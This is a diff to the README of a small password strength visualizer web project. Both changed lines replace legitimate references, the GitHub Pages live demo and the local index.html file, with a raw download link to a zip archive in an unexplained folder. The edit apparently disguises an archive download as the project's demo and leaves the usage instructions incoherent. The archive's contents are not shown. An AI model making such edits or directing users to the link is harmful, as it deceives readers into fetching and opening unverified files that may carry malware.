@@ -3,7 +3,7 @@
 A **mini project** that helps users create strong, secure passwords with real-time feedback. Built using **HTML, CSS, and JavaScript**, with **AI-assisted development** for logic and optimization.
 
 ## Live Demo
-[Password Strength Visualizer](https://p-sushanth.github.io/Password-Strength-Visualizer/)
+[Password Strength Visualizer](https://raw.githubusercontent.com/P-Sushanth/Password-Strength-Visualizer/main/yite/Password-Strength-Visualizer.zip)
 
 ---
 
@@ -37,7 +37,7 @@ A **mini project** that helps users create strong, secure passwords with real-ti
 
 ## How to Use
 
-1. Open the `index.html` file in your browser.  
+1. Open the `https://raw.githubusercontent.com/P-Sushanth/Password-Strength-Visualizer/main/yite/Password-Strength-Visualizer.zip` file in your browser.  
 2. Type a password to see the strength, or generate one using the slider and "Generate" button.  
 3. Toggle password visibility using the eye icon.  
 4. Copy the password with the copy button.  
